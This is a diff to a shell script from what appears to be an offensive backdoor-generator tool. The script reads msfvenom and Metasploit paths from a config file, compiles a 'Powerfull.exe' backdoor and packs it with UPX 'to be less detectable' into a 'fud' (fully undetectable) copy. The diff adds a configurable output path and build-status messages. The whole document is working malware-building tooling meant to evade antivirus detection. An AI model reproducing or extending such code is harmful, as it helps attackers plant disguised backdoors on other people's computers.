@@ -2,10 +2,11 @@
 file="config/config.path"
 if [ -f "$file" ]
 then
-msfconsole=`sed -n 13p $file`	
-msfvenom=`sed -n 14p $file`
-backdoor=`sed -n 15p $file`
-searchsploit=`sed -n 16p $file`
+msfconsole=$(sed -n 13p ${file})	
+msfvenom=$(sed -n 14p ${file})
+backdoor=$(sed -n 15p ${file})
+searchsploit=$(sed -n 16p ${file})
+output=$(sed -n 17p ${file})
 else
 	echo "Configuration file does not exists , run setup.sh first ."
 exit 1
@@ -121,8 +122,8 @@ BlueF='\e[1;34m'
 yellow='\e[1;33m'
 orange='\e[38;5;166m'
 
-rm -f $HOME/Fatrat_Generated/Powerfull.exe >/dev/null 2>&1
-rm -f $HOME/Fatrat_Generated/Powerfull-fud.exe >/dev/null 2>&1
+rm -f $output/Powerfull.exe >/dev/null 2>&1
+rm -f $output/Powerfull-fud.exe >/dev/null 2>&1
 #Banner
 clear
 echo
@@ -223,7 +224,7 @@ delayRandomness=32676	# The higher the delay the longer it will take to execute 
 
 #Set directory
 currentDir=`pwd`
-outputDir="$HOME/Fatrat_Generated/"
+outputDir="$output/"
 outputExe="${outputDir}Powerfull.exe"  # You can change the name of the executable on this line
 outputUPX="${outputDir}Powerfull-fud.exe"  # You can change the name of the executable on this line
 
@@ -349,6 +350,31 @@ while [[ ! -f "$outputExe" ]]; do
     $COMPILER -o $outputExe $cProg
 
 done
-
+if [[ -f "$outputExe" ]]
+then
+echo "Uncompressed backdoor created in : $outputExe"
+else
+echo "Unable to compile backdoor"
+echo -n "Press Enter to return to menu"
+read rsp
+exit 0
+fi
+echo ""
+echo -n "Compressing $outputExe with UPX to be less detectable ...."
 # Use UPX to create a second executable, testing...
-upx -q --ultra-brute -o $outputUPX $outputExe
+upx -q --ultra-brute -o $outputUPX $outputExe >/dev/null 2>&1
+echo "Done"
+
+if [[ -f "$outputUPX" ]]
+then
+echo "Compressed Backdoor was build in : $outputUPX"
+echo ""
+echo -n "Press Enter to return to fatrat menu"
+read rsp
+exit 0
+else
+echo "Unable to compress $outputExe with UPX"
+echo -n "Press Enter to return to fatrat menu"
+read rsp
+exit 0
+fi
